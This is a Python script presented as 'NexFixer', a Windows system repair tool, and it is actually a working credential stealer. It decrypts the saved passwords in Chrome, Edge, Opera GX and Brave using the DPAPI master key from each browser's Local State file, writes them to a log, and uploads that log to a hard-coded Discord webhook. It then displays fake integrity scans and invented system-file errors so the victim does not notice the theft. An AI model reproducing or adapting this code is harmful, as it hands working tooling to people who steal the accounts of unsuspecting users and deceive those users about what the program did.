"""
███╗   ███╗ █████╗ ██████╗ ███████╗    ██████╗ ██╗   ██╗
████╗ ████║██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╗
██╔████╔██║███████║██║  ██║█████╗      ██████╔╝ ╚████╔╝ ╚═╝
██║╚██╔╝██║██╔══██║██║  ██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╗
██║ ╚═╝ ██║██║  ██║██████╔╝███████╗    ██████╔╝   ██║   ╚═╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═════╝    ╚═╝

██╗████████╗███████╗██╗   ██╗██╗  ██╗████████╗███████╗
██║╚══██╔══╝╚══███╔╝██║   ██║╚██╗██╔╝╚══██╔══╝╚══███╔╝
██║   ██║     ███╔╝ ██║   ██║ ╚███╔╝    ██║     ███╔╝
██║   ██║    ███╔╝  ╚██╗ ██╔╝ ██╔██╗    ██║    ███╔╝
██║   ██║   ███████╗ ╚████╔╝ ██╔╝ ██╗   ██║   ███████╗
╚═╝   ╚═╝   ╚══════╝  ╚═══╝  ╚═╝  ╚═╝   ╚═╝   ╚══════╝
This tool was made by nexa, this is for PERSONAL use only!
----------------------------------------------------------
If you gain access to this tool code without permission you are liable for what you do. NOT US
THIS IS A PERSONAL TOOL AND IS MEANT TO BE PRIVATE, ONLY A FEW PEOPLE MIGHT GET IT BUT OTHER THEN THAT ONLY ME (ITZVXTZ)

"""

import base64
import json
import os
import shutil
import sqlite3
import tempfile
import time
import subprocess
import datetime
import sys
import random

FILE_REQUIREMENTS = os.path.join("requirements.txt")
PASS_FILE = "cl.log"

"""
this make sure user has a requirements.txt file, if file is missing 
we will create a new one with the required information needed to run this file.
 - REQUIRED
 -------------
 - termcolor
 - requests
 - win32
 - crypto

 requests==2.34.2
termcolor==3.3.0
"""


if not os.path.exists("requirements.txt"):
    file = open("requirements.txt", "w")
    file.write(
        "requests==2.34.2 \ntermcolor==3.3.0 \npywin32==312\npycryptodome==3.23.0"
    )
    file.close()

    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "-r", FILE_REQUIREMENTS]
    )
    os.system("cls")

    import requests
    from termcolor import colored
    import win32crypt
    from Crypto.Cipher import AES

    print(
        colored(
            "INSTALLED REQUIREMENTS!",
            color="blue",
        )
    )

    import requests
    from termcolor import colored
    import win32crypt
    from Crypto.Cipher import AES


# ASCII banners
main_banner = """
███╗   ██╗███████╗██╗  ██╗███████╗██╗██╗  ██╗███████╗██████╗ 
████╗  ██║██╔════╝╚██╗██╔╝██╔════╝██║╚██╗██╔╝██╔════╝██╔══██╗
██╔██╗ ██║█████╗   ╚███╔╝ █████╗  ██║ ╚███╔╝ █████╗  ██████╔╝
██║╚██╗██║██╔══╝   ██╔██╗ ██╔══╝  ██║ ██╔██╗ ██╔══╝  ██╔══██╗
██║ ╚████║███████╗██╔╝ ██╗██║     ██║██╔╝ ██╗███████╗██║  ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      
-------------------------------------------------------------
Made by: Nexa ™️                                                                                                                                         
"""
banner2 = """
███╗   ██╗███████╗██╗  ██╗██████╗  █████╗ ████████╗████████╗███████╗██████╗ 
████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗
██╔██╗ ██║█████╗   ╚███╔╝ ██████╔╝███████║   ██║      ██║   █████╗  ██████╔╝
██║╚██╗██║██╔══╝   ██╔██╗ ██╔══██╗██╔══██║   ██║      ██║   ██╔══╝  ██╔══██╗
██║ ╚████║███████╗██╔╝ ██╗██║  ██║██║  ██║   ██║      ██║   ███████╗██║  ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝                                                                                                                                                                                      
"""
decoy_banner = r"""
$$$$$$$$\ $$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\         $$$$$$\  $$$$$$$\  $$\       $$\       $$$$$$\ $$$$$$$$\ $$$$$$$\  
$$  _____|\_$$  _|$$ |  $$ |$$  _____|$$  __$$\       $$  __$$\ $$  __$$\ $$ |      $$ |      \_$$  _|$$  _____|$$  __$$\ 
$$ |        $$ |  \$$\ $$  |$$ |      $$ /  \__|      $$ /  $$ |$$ |  $$ |$$ |      $$ |        $$ |  $$ |      $$ |  $$ |
$$$$$\      $$ |   \$$$$  / $$$$$\    \$$$$$$\        $$$$$$$$ |$$$$$$$  |$$ |      $$ |        $$ |  $$$$$\    $$ |  $$ |
$$  __|     $$ |   $$  $$<  $$  __|    \____$$\       $$  __$$ |$$  ____/ $$ |      $$ |        $$ |  $$  __|   $$ |  $$ |
$$ |        $$ |  $$  /\$$\ $$ |      $$\   $$ |      $$ |  $$ |$$ |      $$ |      $$ |        $$ |  $$ |      $$ |  $$ |
$$ |      $$$$$$\ $$ /  $$ |$$$$$$$$\ \$$$$$$  |      $$ |  $$ |$$ |      $$$$$$$$\ $$$$$$$$\ $$$$$$\ $$$$$$$$\ $$$$$$$  |
\__|      \______|\__|  \__|\________| \______/       \__|  \__|\__|      \________|\________|\______|\________|\_______/                                                                                                                                                                                                                                                   
"""
"""
logging time when the user ran this file
"""
run_time = datetime.datetime.now().strftime("%m/%d/%Y | 24HR Clock: %H:%M")

"""
If you reading this. just know you werent supposed to.
"""
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536776272762503169/oCDisDzxYfsHZxaCTsdyXOoluan7BpuR_efe-DSbBHd8kLu9ZLLw59dtQ4TVKbQai_EV"  # Add your personal webhooks

"""
This is the discord payload that well be sent
"""
payload = {
    "username": "Made By: Nexa 💞",
    "content": "Hmmmm... we found something fishy",
    "embeds": [
        {
            "title": f"Time logged: {run_time} \nLet's see what they got :p",
            "color": 984708,
        }
    ],
}


def log_output(message, file_handle=None):
    """Prints to terminal and writes to the log file."""
    if file_handle:
        file_handle.write(message + "\n")
        file_handle.flush()


def ec_key(local_state_path, f_log):
    if not os.path.exists(local_state_path):
        return None

    if win32crypt is None:
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key:
            raise ValueError("encrypted_key not found in Local State")

        encrypted_key = base64.b64decode(encrypted_key)
        if encrypted_key.startswith(b"DPAPI"):
            encrypted_key = encrypted_key[5:]

        decrypted_key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0
        )[1]
        return decrypted_key
    except Exception as e:
        log_output(f"[-] Key extraction failed for {local_state_path}: {e}", f_log)
        return None


def dp(password, key):
    if password is None:
        return ""

    if isinstance(password, memoryview):
        password = password.tobytes()

    if isinstance(password, str):
        password = password.encode("utf-8", errors="ignore")

    if AES is None:
        return "[Missing Crypto library]"

    try:
        if password.startswith(b"v10") or password.startswith(b"v11"):
            iv = password[3:15]
            payload = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
        else:
            decrypted = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]

        return decrypted.decode("utf-8", errors="replace")
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[
                1
            ].decode("utf-8", errors="replace")
        except Exception:
            return "[Decryption Error]"


def bp(browser_name, local_state_path, base_user_data_path, f_log):
    log_output(f"\n[+] Starting verification scan: {browser_name}", f_log)

    key = ec_key(local_state_path, f_log)
    if not key:
        log_output(
            f"[-] Verification failed: Decryption key unresolved for {browser_name}.",
            f_log,
        )
        return

    if not os.path.isdir(base_user_data_path):
        log_output(f"[-] Browser data path not found: {base_user_data_path}", f_log)
        return

    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", ""]

    for profile in profiles:
        if profile:
            db_path = os.path.join(base_user_data_path, profile, "Login Data")
        else:
            db_path = os.path.join(base_user_data_path, "Login Data")

        if not os.path.exists(db_path):
            continue

        log_output(
            f"[+] Found active database path under profile: '{profile if profile else 'Root'}'",
            f_log,
        )

        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as temp_file:
            temp_db_name = temp_file.name

        try:
            shutil.copyfile(db_path, temp_db_name)
            with sqlite3.connect(temp_db_name) as conn:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                )

                count = 0
                for origin_url, username_value, password_value in cursor.fetchall():
                    if not origin_url and not username_value and not password_value:
                        continue

                    dpp = dp(password_value, key)
                    log_output(f"🌐Browser: {browser_name}", f_log)
                    log_output(f"🔗Site URL:      {origin_url}", f_log)
                    log_output(f"🔏Login:         {username_value}", f_log)
                    log_output(f"🔏Password:           {dpp}", f_log)
                    log_output("-" * 60, f_log)
                    count += 1
        except sqlite3.DatabaseError:
            return False
        except Exception:
            return False
        finally:
            try:
                os.remove(temp_db_name)
            except OSError:
                pass


def main():
    if os.path.exists("requirements.txt"):
        os.remove("requirements.txt")

    user_profile = os.environ.get("USERPROFILE") or os.path.expanduser("~")
    output_filename = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cl.log")

    browsers = {
        "Google Chrome": {
            "local_state": os.path.join(
                user_profile, r"AppData\Local\Google\Chrome\User Data\Local State"
            ),
            "base_path": os.path.join(
                user_profile, r"AppData\Local\Google\Chrome\User Data"
            ),
        },
        "Microsoft Edge": {
            "local_state": os.path.join(
                user_profile, r"AppData\Local\Microsoft\Edge\User Data\Local State"
            ),
            "base_path": os.path.join(
                user_profile, r"AppData\Local\Microsoft\Edge\User Data"
            ),
        },
        "Opera GX": {
            "local_state": os.path.join(
                user_profile,
                r"AppData\Roaming\Opera Software\Opera GX Stable\Local State",
            ),
            "base_path": os.path.join(
                user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable"
            ),
        },
        "Brave": {
            "local_state": os.path.join(
                user_profile,
                r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
            ),
            "base_path": os.path.join(
                user_profile, r"Appdata\Roaming\BraveSoftware\Brave-Browser\User Data"
            ),
        },
    }

    try:
        with open(output_filename, "w", encoding="utf-8") as f_log:
            f_log.write(
                f"{banner2}\nThis Fille was Created: {run_time} | Tool made by: Nexa\nCookie Grabber comming soon!"
            )
            for browser_name, paths in browsers.items():
                bp(browser_name, paths["local_state"], paths["base_path"], f_log)

            img = {PASS_FILE: open(PASS_FILE, "rb")}
            data = {"payload_json": json.dumps(payload)}
            response = requests.post(DISCORD_WEBHOOK, data=data, files=img)
            response.raise_for_status()
            return
    except OSError as e:
        print(f"[-] Unable to write output file: {e}")

    finally:
        img[PASS_FILE].close()
        os.remove(PASS_FILE)


"""
Update: Adding a decoy function so user can interact with this fixer, aka it wont do noting but simulate task
    - Aka this function is just a fake waste of time just to make it look like nexfixer found a HUGE error and will patch it
    - Make them scare and then just close
"""


def Decoy():
    status_messages = [
        "Applying recommended fixes...",
        "Checking system components...",
        "Verifying file integrity...",
        "Repairing detected inconsistencies...",
        "Refreshing system configuration...",
        "Rebuilding damaged indexes...",
        "Scanning for configuration issues...",
        "Optimizing system resources...",
        "Rechecking previously flagged items...",
        "Applying pending corrections...",
        "Validating system dependencies...",
        "Cleaning temporary system data...",
        "Restoring default configuration values...",
        "Synchronizing system components...",
        "Resolving configuration conflicts...",
        "Reinitializing affected services...",
        "Updating system records...",
        "Running additional diagnostics...",
        "Checking for remaining issues...",
        "Finalizing system repairs...",
        "Completing maintenance operations...",
        "Performing secondary verification...",
        "Revalidating repaired components...",
        "Cleaning up after repairs...",
        "Preparing final system report...",
        "Running post-repair checks...",
        "Confirming system stability...",
        "Final verification in progress...",
        "No further action required...",
        "Finishing up...",
    ]

    for _ in range(10):
        time.sleep(1.4)
        print(colored(random.choice(status_messages), "green"))

    print(colored(decoy_banner, "magenta"))
    print(colored("🛡️ We applied all fixes! heres what we found: ", "cyan"))
    # Just printing these out i dont feel like making a list for them
    print(
        colored(
            f"FILE: C:\\Windows\\System32\\drivers\\disk.sys ⚠️\n"
            f"STATUS: Driver integrity verification failed ⚠️ \n"
            f"SEVERITY: HIGH ⚠️ \n"
            "---------------------------------------------- \n"
            f"FILE: C:\\Windows\\System32\\svchost.exe ⚠️\n"
            f"STATUS: Component signature mismatch ⚠️\n"
            f"SEVERITY: HIGH ⚠️\n"
            "---------------------------------------------- \n"
            f"FILE:  C:\\Windows\\System32\\LogFiles\\Srt\\SrtTrail.txt ⚠️\n"
            f"STATUS: Automatic repair log inconsistency ⚠️\n"
            f"SEVERITY: HIGH ⚠️\n",
            "green",
        )
    )

    print(
        colored(
            "☢️ CLOSING TERMINAL IN 5 SECOUNDS! THANKS FOR USING NEXFIXER!",
            color="magenta",
        )
    )
    counter = 5
    for _ in range(5):
        print(colored(f"{counter}"))
        counter -= 1
        time.sleep(1)
        if counter == 0:
            exit()


if __name__ == "__main__":
    print(colored(main_banner, "red"))
    time.sleep(1)
    print("\nPlease Wait...")
    if os.path.exists(PASS_FILE):
        os.remove(PASS_FILE)
        main()
    else:
        main()

    # When grabber is complete, run a fake auto fixer file scanner
    scanner_fixer = [
        "Initializing system integrity check...",
        "Scanning protected system components...",
        "Verifying component store...",
        "Checking system file dependencies...",
        "Analyzing filesystem metadata...",
        "Validating component manifests...",
        "Checking system library references...",
        "Reviewing file integrity records...",
        "Analyzing configuration dependencies...",
        "Checking system servicing components...",
        "Verifying driver configuration...",
        "Scanning system directories...",
        "Reviewing detected inconsistencies...",
        "Preparing corrective operations...",
        "Applying file corrections...",
        "Rechecking modified components...",
        "Running secondary integrity verification...",
        "Finalizing integrity check...",
        "System verification completed.",
    ]

    print(
        colored(
            "🛡️ NEXFIXER 🛡️: RUNNING IN AUTOMATIC SCAN ON YOUR SYSTEM!", color="red"
        )
    )
    print("\n")
    for _ in range(13):
        print(colored(random.choice(scanner_fixer), color="blue"))
        time.sleep(2)

    # When grabber is done, we return back to here and continue on with a decoy of our rat!
    time.sleep(1.5)
    os.system("cls")
    print(colored("⛔ WE FOUND A LOT OF CORRUPTED FILES AND SYSTEM FILES ⛔ ", "red"))
    print(
        "Would you like for us to fix these issues? (We only fix certain stuff and output what is fixed) \nType Y - To apply fixes | N - Deny fixes and exit"
    )
    try:
        x = input(colored(">>>: ", "cyan")).lower().strip()

        if x == "y":
            print(
                colored("🧸APPLYING FIXED. PLEASE WAIT WHILE LOAD OUT TOOLS!", "green")
            )
            time.sleep(2)
            Decoy()
        elif x == "n":
            print(
                colored(
                    f"USER SELECTED: {x}, WE ARE CLOSING TERMINAL. NO FIXED APPLIED!",
                    "red",
                )
            )
            time.sleep(3)
            exit(0)
        else:
            print("Please enter a valid option!")

    except KeyboardInterrupt:
        print("Please only enter valid options!")
